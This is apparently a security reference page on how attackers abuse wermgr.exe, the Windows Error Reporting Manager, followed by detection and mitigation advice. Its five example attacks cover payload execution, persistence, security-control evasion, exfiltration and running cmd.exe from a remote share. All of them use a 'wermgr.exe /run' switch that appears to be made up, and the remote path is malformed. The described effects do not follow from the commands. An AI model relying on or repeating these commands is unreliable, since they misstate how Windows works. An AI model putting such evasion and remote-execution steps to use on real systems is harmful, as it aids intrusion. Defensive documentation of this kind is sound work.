# wermgr.exe
## What is it?
*```wermgr.exe``` is the Windows Error Reporting Manager, a system process that handles the collection and submission of error reports to Microsoft when a program crashes or encounters a fault.*

*It is part of the Windows operating system, designed to help diagnose and resolve software issues by sending error data to Microsoft.*

*While legitimate in nature, attackers can misuse ```wermgr.exe``` to evade detection or to launch malicious payloads under the guise of a trusted system process.*

## Legitimate Usage
- **Error Reporting** → Collects error data when applications crash or encounter unexpected issues and sends it to Microsoft for troubleshooting.
- **Application Diagnostics** → Helps system administrators and support teams gather error logs for diagnosing application failures.
- **System Stability Improvement** → Allows Microsoft to gather information that helps improve the stability of Windows and installed software.

## How to abuse it
- **Bypassing Security Controls** → Attackers can invoke ```wermgr.exe``` to execute malicious code under the guise of a legitimate system process.
- **Persistence** → Attackers can use ```wermgr.exe``` to maintain access to a system by invoking it with malicious payloads through error reporting.
- **Evasion of Detection** → Since ```wermgr.exe``` is a trusted Windows process, its execution is often overlooked by security tools, making it useful for evading detection.
- **Exfiltration via Error Reports** → Malicious actors could exploit the error reporting system to exfiltrate sensitive data by embedding it in error reports sent to Microsoft.

## Example attacks
### 1. Using wermgr.exe for Payload Execution
*Attackers can use ```wermgr.exe``` to execute malicious code disguised as part of the error reporting process.*

**Invoke Malicious Payload Using wermgr.exe**

```
wermgr.exe /run C:\malicious\payload.exe
```

**Effect:**
- Executes the malicious payload while appearing as a legitimate process to security tools.

### 2. Exploiting Error Reporting for Persistence
*An attacker may create a custom error report that, upon execution by ```wermgr.exe```, ensures that malicious code is run repeatedly.*

**Create a Malicious Error Report to Trigger wermgr.exe**

```
wermgr.exe /run C:\malicious\error_report.xml
```

**Effect:**
- Executes malicious code contained within the error report each time the system experiences an issue, ensuring persistence.

### 3. Evasion by Leveraging Legitimate Tools
*Because ```wermgr.exe``` is often trusted by security software, attackers can exploit it to bypass security measures like AppLocker or antivirus detection.*

**Invoke wermgr.exe to Launch a Hidden Command**

```
wermgr.exe /run cmd.exe /c "echo Malicious command"
```

**Effect:**
- Executes the command using ```wermgr.exe``` to bypass security measures while hiding the true intent behind a trusted process.

### 4. Exfiltration of Data via Error Reports
*Attackers can use the error reporting functionality to exfiltrate sensitive information by embedding it in error reports sent to Microsoft.*

**Embed Exfiltrated Data in Error Report**

```
wermgr.exe /run C:\exfil\file.txt
```

**Effect:**
- Uses error reporting as a method to silently exfiltrate sensitive data from the compromised system, potentially without detection.

### 5. Leveraging wermgr.exe for Remote Command Execution
*Attackers can remotely invoke ```wermgr.exe``` to execute commands on a compromised system.*

**Execute Remote Command Using wermgr.exe**

```
wermgr.exe /run \192.168.1.50\c$\Windows\System32\cmd.exe
```

**Effect:**
- Uses ```wermgr.exe``` to run commands remotely, potentially on a target system, under the appearance of a legitimate Windows process.

# Detection & Mitigation
## Detection Methods
**Monitor Execution of wermgr.exe**
- **Event ID 4688 (Process Creation)** → Detect the execution of ```wermgr.exe``` with unusual or suspicious command-line arguments.
- **Behavioral Analysis** → Look for attempts to execute other processes or payloads through ```wermgr.exe```.

**Network Traffic Analysis**
- **Analyze Error Report Submissions** → Check for abnormal or unexpected error report submissions from systems that may indicate data exfiltration or exploitation.
- **Monitor for Suspicious Error Report Content** → Look for unexpected files or payloads being transferred via error reporting channels.

**File Integrity Monitoring**
- **Monitor for Unexpected Error Report Files** → Track changes to or creation of error report files that are linked to malicious activity or unexpected behavior.

## Mitigation Strategies
- **Restrict the Use of wermgr.exe** → Limit the execution of ```wermgr.exe``` through Application Control (e.g., AppLocker, WDAC) to only authorized and trusted systems or users.
- **Disable Error Reporting** → Disable or restrict error reporting functionality if it is not needed in an environment to prevent it from being exploited.
- **Monitor Error Reporting Logs** → Regularly audit error report logs for unusual or suspicious entries that might indicate malicious activity.
- **Use Endpoint Detection and Response (EDR)** → Leverage EDR tools to detect malicious activity originating from legitimate system processes like ```wermgr.exe```.
